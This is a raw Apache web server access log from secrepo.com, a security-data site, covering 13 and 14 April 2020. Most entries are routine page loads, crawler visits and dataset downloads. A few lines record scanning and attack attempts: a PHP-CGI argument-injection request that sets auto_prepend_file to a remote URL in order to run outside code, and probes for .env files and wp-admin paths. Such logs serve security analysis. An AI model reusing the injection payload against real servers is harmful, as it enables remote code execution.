1.83.125.93 - - [13/Apr/2020:02:04:29 -0700] "GET /favicon.ico HTTP/1.1" 200 391 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" 
66.249.88.113 - - [13/Apr/2020:18:29:56 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 713 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
40.89.133.22 - - [13/Apr/2020:18:36:03 -0700] "GET /index.php?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp://tenderplus.spb.ru//components/com_foxcontact/default.txt HTTP/1.1" 404 328 "-" "-" 
49.79.154.242 - - [13/Apr/2020:18:37:44 -0700] "HEAD / HTTP/1.1" 301 223 "http://secrepo.com" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
49.79.154.242 - - [13/Apr/2020:18:37:45 -0700] "HEAD / HTTP/1.1" 200 396 "http://secrepo.com" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
60.194.241.13 - - [13/Apr/2020:18:53:37 -0700] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363" 
47.108.80.103 - - [13/Apr/2020:18:56:37 -0700] "GET /wangdafa HTTP/1.1" 404 328 "-" "python-requests/2.22.0" 
222.164.25.206 - - [13/Apr/2020:19:04:06 -0700] "GET /css/style.css HTTP/1.1" 404 328 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36" 
108.59.8.70 - - [13/Apr/2020:19:18:07 -0700] "GET /robots.txt HTTP/1.1" 200 377 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
108.59.8.70 - - [13/Apr/2020:19:18:09 -0700] "GET / HTTP/1.1" 200 12733 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
52.212.146.96 - - [13/Apr/2020:19:30:01 -0700] "GET /self.logs/access.log.2020-04-07.gz HTTP/1.1" 200 16427 "-" "python-requests/2.12.1" 
52.212.146.96 - - [13/Apr/2020:19:30:02 -0700] "GET /self.logs/access.log.2020-04-08.gz HTTP/1.1" 200 18806 "-" "python-requests/2.12.1" 
52.212.146.96 - - [13/Apr/2020:19:30:02 -0700] "GET /self.logs/access.log.2020-04-09.gz HTTP/1.1" 200 19006 "-" "python-requests/2.12.1" 
52.212.146.96 - - [13/Apr/2020:19:30:02 -0700] "GET /self.logs/access.log.2020-04-10.gz HTTP/1.1" 200 29392 "-" "python-requests/2.12.1" 
52.212.146.96 - - [13/Apr/2020:19:30:03 -0700] "GET /self.logs/access.log.2020-04-11.gz HTTP/1.1" 404 328 "-" "python-requests/2.12.1" 
52.212.146.96 - - [13/Apr/2020:19:30:03 -0700] "GET /self.logs/access.log.2020-04-12.gz HTTP/1.1" 404 328 "-" "python-requests/2.12.1" 
52.212.146.96 - - [13/Apr/2020:19:30:03 -0700] "GET /self.logs/access.log.2020-04-13.gz HTTP/1.1" 404 328 "-" "python-requests/2.12.1" 
207.46.13.239 - - [13/Apr/2020:19:32:54 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/notice.html HTTP/1.1" 304 277 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.239 - - [13/Apr/2020:19:35:34 -0700] "GET / HTTP/1.1" 200 12777 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
223.91.193.98 - - [13/Apr/2020:19:41:13 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 64952 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
223.91.193.98 - - [13/Apr/2020:19:41:19 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 206 79072 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
223.91.193.98 - - [13/Apr/2020:19:41:18 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 206 64952 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
223.91.193.98 - - [13/Apr/2020:19:41:32 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 206 64952 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
223.91.193.98 - - [13/Apr/2020:19:41:20 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 206 64952 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
223.91.193.98 - - [13/Apr/2020:19:41:18 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 206 64952 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
223.91.193.98 - - [13/Apr/2020:19:41:18 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 206 64952 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
223.91.193.98 - - [13/Apr/2020:19:40:47 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 87544 "https://blog.csdn.net/answer3lin/article/details/82966360" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0" 
223.91.193.98 - - [13/Apr/2020:19:41:32 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 206 64952 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
223.91.193.98 - - [13/Apr/2020:19:41:37 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 206 60716 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
223.91.193.98 - - [13/Apr/2020:19:41:36 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 206 64952 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
111.6.128.200 - - [13/Apr/2020:19:41:24 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 160600 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
27.186.194.119 - - [13/Apr/2020:19:57:54 -0700] "GET /favicon.ico HTTP/1.1" 200 391 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0" 
101.12.50.210 - - [13/Apr/2020:20:10:37 -0700] "GET / HTTP/1.1" 200 12775 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36" 
101.12.50.210 - - [13/Apr/2020:20:10:38 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36" 
101.12.50.210 - - [13/Apr/2020:20:10:38 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27893 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36" 
101.12.50.210 - - [13/Apr/2020:20:10:38 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7556 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36" 
101.12.50.210 - - [13/Apr/2020:20:10:39 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36" 
106.37.239.65 - - [13/Apr/2020:20:16:10 -0700] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" 
106.37.239.65 - - [13/Apr/2020:20:16:11 -0700] "GET / HTTP/1.1" 200 12777 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" 
106.37.239.65 - - [13/Apr/2020:20:16:12 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" 
106.37.239.65 - - [13/Apr/2020:20:16:12 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27916 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" 
106.37.239.65 - - [13/Apr/2020:20:16:12 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7533 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" 
23.100.232.233 - - [13/Apr/2020:20:16:13 -0700] "GET / HTTP/1.1" 200 12777 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0;  Trident/5.0)" 
23.100.232.233 - - [13/Apr/2020:20:16:13 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0;  Trident/5.0)" 
106.37.239.65 - - [13/Apr/2020:20:16:21 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 713 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" 
192.210.190.252 - - [13/Apr/2020:20:37:20 -0700] "GET / HTTP/1.1" 200 12732 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:60.0) Gecko/20100101 Firefox/60.0" 
192.210.190.252 - - [13/Apr/2020:20:37:21 -0700] "GET /Datasets%20Description/PE_malware/VirusShare.html HTTP/1.1" 200 1607 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:60.0) Gecko/20100101 Firefox/60.0" 
70.95.2.74 - - [13/Apr/2020:20:55:44 -0700] "GET / HTTP/1.1" 200 12776 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36" 
70.95.2.74 - - [13/Apr/2020:20:55:44 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36" 
70.95.2.74 - - [13/Apr/2020:20:55:44 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27916 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36" 
70.95.2.74 - - [13/Apr/2020:20:55:45 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7533 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36" 
70.95.2.74 - - [13/Apr/2020:20:55:47 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 713 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36" 
223.88.1.103 - - [13/Apr/2020:21:02:34 -0700] "GET /favicon.ico HTTP/1.1" 200 391 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" 
188.76.8.243 - - [13/Apr/2020:21:06:36 -0700] "GET / HTTP/1.1" 200 12778 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/605.1.15 (KHTML, like Gecko)" 
188.76.8.243 - - [13/Apr/2020:21:06:37 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 328 "-" "Safari/13605.2.8 CFNetwork/901.1 Darwin/17.6.0 (x86_64)" 
188.76.8.243 - - [13/Apr/2020:21:06:37 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 305 "-" "Safari/13605.2.8 CFNetwork/901.1 Darwin/17.6.0 (x86_64)" 
188.76.8.243 - - [13/Apr/2020:21:06:37 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "-" "Safari/13605.2.8 CFNetwork/901.1 Darwin/17.6.0 (x86_64)" 
188.76.8.243 - - [13/Apr/2020:21:06:37 -0700] "GET / HTTP/1.1" 200 12755 "-" "\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1\"" 
188.76.8.243 - - [13/Apr/2020:21:06:37 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 305 "-" "Safari/13605.2.8 CFNetwork/901.1 Darwin/17.6.0 (x86_64)" 
188.76.8.243 - - [13/Apr/2020:21:06:38 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 305 "-" "Safari/13605.2.8 CFNetwork/901.1 Darwin/17.6.0 (x86_64)" 
188.76.8.243 - - [13/Apr/2020:21:06:38 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "-" "Safari/13605.2.8 CFNetwork/901.1 Darwin/17.6.0 (x86_64)" 
157.38.224.230 - - [13/Apr/2020:21:17:37 -0700] "GET / HTTP/1.1" 200 12778 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
157.38.224.230 - - [13/Apr/2020:21:17:37 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27916 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
157.38.224.230 - - [13/Apr/2020:21:17:37 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
157.38.224.230 - - [13/Apr/2020:21:17:39 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7533 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
157.38.224.230 - - [13/Apr/2020:21:17:50 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 713 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
120.227.175.224 - - [13/Apr/2020:21:21:16 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 23086087 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36" 
36.110.147.105 - - [13/Apr/2020:21:25:04 -0700] "GET / HTTP/1.1" 200 12778 "http://www.sogou.com/web?query=site%3Awww.secrepo.com" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
74.83.4.243 - - [13/Apr/2020:21:43:46 -0700] "GET / HTTP/1.1" 200 12778 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36" 
74.83.4.243 - - [13/Apr/2020:21:43:46 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36" 
74.83.4.243 - - [13/Apr/2020:21:43:46 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27916 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36" 
74.83.4.243 - - [13/Apr/2020:21:43:46 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7556 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36" 
74.83.4.243 - - [13/Apr/2020:21:43:47 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36" 
37.115.196.177 - - [13/Apr/2020:22:04:07 -0700] "GET / HTTP/1.1" 200 47558 "https://erotag.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)" 
37.115.196.177 - - [13/Apr/2020:22:04:07 -0700] "GET / HTTP/1.1" 200 47558 "https://erotag.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)" 
37.115.196.177 - - [13/Apr/2020:22:04:08 -0700] "GET / HTTP/1.1" 200 47558 "https://erotag.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)" 
103.78.115.92 - - [13/Apr/2020:22:07:04 -0700] "GET / HTTP/1.1" 301 475 "http://anti-crisis-seo.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
74.208.56.61 - - [13/Apr/2020:22:13:02 -0700] "GET /test/wp-admin/ HTTP/1.1" 301 466 "-" "-" 
183.111.174.4 - - [13/Apr/2020:22:19:47 -0700] "GET /wordpress/wp-admin/ HTTP/1.1" 301 476 "-" "-" 
66.249.75.49 - - [13/Apr/2020:22:25:39 -0700] "GET /ads.txt HTTP/1.1" 404 328 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
69.49.117.145 - - [13/Apr/2020:22:33:23 -0700] "GET /wp/wp-admin/ HTTP/1.1" 301 462 "-" "-" 
54.242.248.72 - - [13/Apr/2020:22:33:51 -0700] "GET / HTTP/1.1" 200 12734 "-" "Mozilla/5.0 (compatible; startmebot/1.0; +https://start.me/bot)" 
123.125.67.156 - - [13/Apr/2020:22:35:01 -0700] "GET /robots.txt HTTP/1.1" 200 340 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36" 
91.238.161.174 - - [13/Apr/2020:22:40:11 -0700] "GET /old/wp-admin/ HTTP/1.1" 301 464 "-" "-" 
162.210.196.129 - - [13/Apr/2020:22:44:48 -0700] "GET /robots.txt HTTP/1.1" 200 377 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.129 - - [13/Apr/2020:22:44:51 -0700] "GET / HTTP/1.1" 200 12734 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.129 - - [13/Apr/2020:22:54:49 -0700] "GET /robots.txt HTTP/1.1" 301 495 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.129 - - [13/Apr/2020:22:55:06 -0700] "GET /robots.txt HTTP/1.1" 200 377 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.129 - - [13/Apr/2020:22:55:09 -0700] "GET / HTTP/1.1" 301 419 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.129 - - [13/Apr/2020:22:55:11 -0700] "GET / HTTP/1.1" 200 12734 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
82.165.67.51 - - [13/Apr/2020:22:55:13 -0700] "GET /.env HTTP/1.1" 301 483 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0" 
23.100.232.233 - - [13/Apr/2020:22:57:31 -0700] "GET / HTTP/1.1" 200 12778 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  Trident/5.0)" 
23.100.232.233 - - [13/Apr/2020:22:57:32 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  Trident/5.0)" 
40.77.167.144 - - [13/Apr/2020:23:22:22 -0700] "GET /self.logs/?C=S;O=A HTTP/1.1" 200 25760 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
66.249.69.37 - - [13/Apr/2020:23:25:40 -0700] "GET /ads.txt HTTP/1.1" 301 489 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
47.56.234.25 - - [13/Apr/2020:23:42:43 -0700] "GET / HTTP/1.1" 200 12734 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1" 
221.237.9.195 - - [13/Apr/2020:23:45:53 -0700] "GET / HTTP/1.1" 200 12778 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36" 
221.237.9.195 - - [13/Apr/2020:23:45:54 -0700] "GET /css/style.css HTTP/1.1" 404 328 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36" 
106.37.239.65 - - [14/Apr/2020:00:02:21 -0700] "GET / HTTP/1.1" 200 12775 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
106.37.239.65 - - [14/Apr/2020:00:02:21 -0700] "GET /css/style.css HTTP/1.1" 404 328 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
106.37.239.65 - - [14/Apr/2020:00:02:24 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27916 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
106.37.239.65 - - [14/Apr/2020:00:02:27 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7556 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
66.249.75.47 - - [14/Apr/2020:00:02:58 -0700] "GET /Datasets%20Description/ HTTP/1.1" 200 677 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
106.37.239.65 - - [14/Apr/2020:00:03:01 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 713 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
40.77.167.144 - - [14/Apr/2020:00:07:17 -0700] "GET /self.logs/access.log.2017-03-10.gz HTTP/1.1" 304 280 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
51.81.254.17 - - [13/Apr/2020:23:59:39 -0700] "GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1" 200 543860220 "-" "Ruby" 
207.46.13.239 - - [14/Apr/2020:00:26:02 -0700] "GET /self.logs/access.log.2017-04-20.gz HTTP/1.1" 200 16709 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
220.181.108.152 - - [14/Apr/2020:00:29:21 -0700] "GET /Datasets%20Description/Network/ftp.html HTTP/1.1" 200 1493 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
207.46.13.239 - - [14/Apr/2020:00:30:53 -0700] "GET /self.logs/access.log.2017-09-05.gz HTTP/1.1" 304 280 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
106.37.239.65 - - [14/Apr/2020:00:32:44 -0700] "GET /maccdc2012/tunnel.log.gz HTTP/1.1" 200 5282 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
113.118.171.133 - - [14/Apr/2020:00:39:25 -0700] "HEAD / HTTP/1.1" 301 223 "http://secrepo.com" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
113.118.171.133 - - [14/Apr/2020:00:39:26 -0700] "HEAD / HTTP/1.1" 200 396 "http://secrepo.com" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
104.36.19.21 - - [14/Apr/2020:00:41:38 -0700] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36" 
